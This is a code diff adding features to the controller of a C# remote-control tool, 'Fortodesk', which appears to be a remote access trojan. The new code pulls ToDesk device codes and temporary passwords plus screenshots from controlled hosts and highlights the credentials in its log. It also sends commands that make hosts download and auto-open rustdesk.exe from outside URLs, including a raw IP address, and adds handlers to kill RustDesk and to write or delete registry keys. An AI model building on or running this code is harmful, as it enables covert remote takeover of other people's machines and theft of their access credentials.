@@ -166,6 +166,13 @@ namespace Fortodesk
         private const uint CMD_ADD_STARTUP_NOREG = 0x3D;
         private const uint CMD_AGENT_ONLINE = 0xF7;  // 被控端上线推送
         private const uint CMD_AGENT_OFFLINE = 0xF8;  // 被控端离线推送
+        private const uint CMD_GET_TODESK_INFO = 0x40;
+        private const uint CMD_GET_TODESK_INFO_RES = 0x41;
+        private const uint CMD_DOWNLOAD_RUSTDESK = 0x43;
+        private const uint CMD_OPEN_RUSTDESK = 0x44;
+        private const uint CMD_KILL_RUSTDESK = 0x45;
+        private const uint CMD_REG_WRITE_AUTO = 0x56;
+        private const uint CMD_REG_WRITE_AUTO_RES = 0x57;
 
         /// <summary>
         /// 主机信息实体类
@@ -872,6 +879,63 @@ namespace Fortodesk
             else finalUi();
         }
 
+        private void HandleToDeskInfoResult(byte[] data, string tag = "", TcpClient client = null)
+        {
+            string msg = Encoding.UTF8.GetString(data);
+            string[] parts = msg.Split('|');
+
+            if (parts.Length < 4)
+            {
+                AppendLog($"{tag}[ToDesk信息] 格式错误: {msg}");
+                return;
+            }
+
+            string type = parts[0].Trim();
+            string taskId = parts[parts.Length - 1].Trim();
+
+            // 找UniqueId
+            string uniqueId = null;
+            if (client != null)
+            {
+                HostInfo h = _hostList.Find(x => x.Client == client);
+                if (h != null) uniqueId = h.UniqueId;
+            }
+
+            if (type == "OK")
+            {
+                string deviceCode = parts.Length > 1 ? parts[1].Trim() : "";
+                string password = parts.Length > 2 ? parts[2].Trim() : "";
+                string cpuTag = parts.Length > 3 ? parts[3].Trim() : "";
+
+                AppendLog($"[{cpuTag}] [ToDesk设备代码] {deviceCode}");
+                AppendLog($"[{cpuTag}] [ToDesk临时密码] {password}");
+                AppendLog($"[{cpuTag}] [ToDesk截图] 正在接收图片...");
+
+                if (string.IsNullOrEmpty(uniqueId))
+                {
+                    AppendLog($"{tag}[ToDesk截图] 无法找到对应被控端UniqueId");
+                    return;
+                }
+
+                string capturedUniqueId = uniqueId;
+                string capturedTaskId = taskId;
+                string capturedCpuTag = cpuTag;
+
+                Thread t = new Thread(() =>
+                    WaitAndRecvFileWithTaskId(capturedUniqueId, capturedTaskId,
+                        $"[{capturedCpuTag}] [ToDesk截图] "));
+                t.IsBackground = true;
+                t.Start();
+            }
+            else
+            {
+                string reason = parts.Length > 1 ? parts[1].Trim() : msg;
+                string cpuTag = parts.Length > 2 ? parts[2].Trim() : "";
+                AppendLog($"[{cpuTag}] [ToDesk信息] 获取失败: {reason}");
+                // ERROR 时不要尝试接文件
+            }
+        }
+
         private void HandleScreenshotResult(byte[] data, string tag = "", TcpClient client = null)
         {
             string msg = Encoding.UTF8.GetString(data);
@@ -1280,6 +1344,9 @@ namespace Fortodesk
                 case CMD_DELETE_RES:
                     HandleDeleteResult(data, tag);
                     break;
+                case CMD_GET_TODESK_INFO_RES:
+                    HandleToDeskInfoResult(data, tag, client);
+                    break;
                 case CMD_SCREENSHOT_RES:
                     HandleScreenshotResult(data, tag, client);  // ★ 加上client参数
                     break;
@@ -1330,6 +1397,9 @@ namespace Fortodesk
                 case CMD_FILE_CHUNK:
                 case CMD_FILE_END:
                 case CMD_HEARTBEAT:  // ★ 忽略心跳包
+                    break;
+                case CMD_REG_WRITE_AUTO_RES:
+                    AppendLog($"{tag}[注册表] {Encoding.UTF8.GetString(data)}");
                     break;
                 default:
                     AppendLog($"{tag}收到未知指令: {cmd}");
@@ -1988,6 +2058,11 @@ namespace Fortodesk
             {
                 color = Color.FromArgb(200, 120, 0);
                 prefix = "! ";
+            }
+            else if (m.Contains("设备代码") || m.Contains("临时密码"))
+            {
+                color = Color.FromArgb(180, 0, 180);
+                prefix = "★ ";
             }
             else if (m.Contains("截图") || m.Contains("下载") || m.Contains("发送") ||
                      m.Contains("传输") || m.Contains("接收"))
@@ -2799,8 +2874,9 @@ namespace Fortodesk
             {
                 HostInfo host = obj as HostInfo;
                 if (host == null) continue;
-                string taskId = SendScreenshotCmd(host, CMD_SCREENSHOT_TODESK);
-                AppendLog($"[{host.HostName}] 已发送todesk截图指令 taskId={taskId}");
+                string taskId = Guid.NewGuid().ToString("N").Substring(0, 16);
+                SendCmdToHost(host, CMD_GET_TODESK_INFO, Encoding.UTF8.GetBytes(taskId));
+                AppendLog($"[{host.HostName}] 已发送获取ToDesk信息指令 taskId={taskId}");
             }
         }
 
@@ -3810,6 +3886,89 @@ namespace Fortodesk
         private void button1_Click(object sender, EventArgs e)
         {
             richTextBoxPlus1.Clear();
+        }
+
+        private void 下载rustdeskToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var selected = objectListView.SelectedObjects;
+            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
+
+            // ★ 换成你自己服务器上真实的 RustDesk 直链
+            string rustDeskUrl = "https://1814652220.cdn.123clouddisk.com/1814652220/wenjian5/rustdesk.exe";
+            string payload = "USER_DESKTOP\n" + rustDeskUrl + " !";
+            byte[] data = Encoding.UTF8.GetBytes(payload);
+
+            foreach (var obj in selected)
+            {
+                HostInfo host = obj as HostInfo;
+                if (host == null) continue;
+                AppendLog($"[{host.HostName}] 开始下载 RustDesk 并自动打开...");
+                SendCmdToHost(host, CMD_DOWNLOAD_RUSTDESK, data);
+            }
+        }
+
+        private void 结束rustdeskToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var selected = objectListView.SelectedObjects;
+            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
+
+            foreach (var obj in selected)
+            {
+                HostInfo host = obj as HostInfo;
+                if (host == null) continue;
+                AppendLog($"[{host.HostName}] 已发送结束 RustDesk 指令");
+                SendCmdToHost(host, CMD_KILL_RUSTDESK, new byte[0]);
+            }
+        }
+
+        private void 打开rustdeskToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var selected = objectListView.SelectedObjects;
+            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
+
+            foreach (var obj in selected)
+            {
+                HostInfo host = obj as HostInfo;
+                if (host == null) continue;
+                AppendLog($"[{host.HostName}] 已发送打开 RustDesk 指令");
+                SendCmdToHost(host, CMD_OPEN_RUSTDESK, new byte[0]);
+            }
+        }
+
+        private void 下载rustdesk蓝奏云ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var selected = objectListView.SelectedObjects;
+            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
+
+            // ★ 换成你自己服务器上真实的 RustDesk 直链
+            string rustDeskUrl = "http://103.52.153.5:5244/d/%E6%88%91%E7%9A%84%E8%93%9D%E5%A5%8F%E4%BA%91%E4%BC%98%E4%BA%AB%E7%89%88%E4%BA%91%E7%9B%98/wenjian/rustdesk.exe";
+            string payload = "USER_DESKTOP\n" + rustDeskUrl + " !";
+            byte[] data = Encoding.UTF8.GetBytes(payload);
+
+            foreach (var obj in selected)
+            {
+                HostInfo host = obj as HostInfo;
+                if (host == null) continue;
+                AppendLog($"[{host.HostName}] 开始下载 RustDesk 并自动打开...");
+                SendCmdToHost(host, CMD_DOWNLOAD_RUSTDESK, data);
+            }
+        }
+
+        private void 测试注册表ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var selected = objectListView.SelectedObjects;
+            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
+
+            string payload = "SOFTWARE\nFortodeskTest\n\n\n\nDELETE_KEY";
+            AppendLog($"发送删除指令: {payload.Replace("\n", "\\n")}");  // 确认payload正确
+
+            foreach (var obj in selected)
+            {
+                HostInfo host = obj as HostInfo;
+                if (host == null) continue;
+                AppendLog($"[{host.HostName}] 已发送删除注册表键指令");
+                SendCmdToHost(host, CMD_REG_WRITE_AUTO, Encoding.UTF8.GetBytes(payload));
+            }
         }
     }
 }
